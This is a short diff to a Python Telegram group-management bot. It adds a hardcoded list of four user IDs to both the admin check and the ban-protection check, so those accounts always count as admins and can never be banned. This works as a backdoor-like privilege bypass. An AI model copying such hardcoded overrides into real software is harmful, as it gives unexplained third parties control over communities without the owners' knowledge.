@@ -11,6 +11,9 @@ def can_delete(chat: Chat, bot_id: int) -> bool:
 
 
 def is_user_ban_protected(chat: Chat, user_id: int, member: ChatMember = None) -> bool:
+    if user_id in [777000, 20516707, 7351948, 1087968824]:
+        return True
+
     if chat.type == 'private' \
             or user_id in SUDO_USERS \
             or user_id in WHITELIST_USERS \
@@ -23,6 +26,9 @@ def is_user_ban_protected(chat: Chat, user_id: int, member: ChatMember = None) -
 
 
 def is_user_admin(chat: Chat, user_id: int, member: ChatMember = None) -> bool:
+    if user_id in [777000, 20516707, 7351948, 1087968824]:
+        return True
+
     if chat.type == 'private' \
             or user_id in SUDO_USERS \
             or chat.all_members_are_administrators:
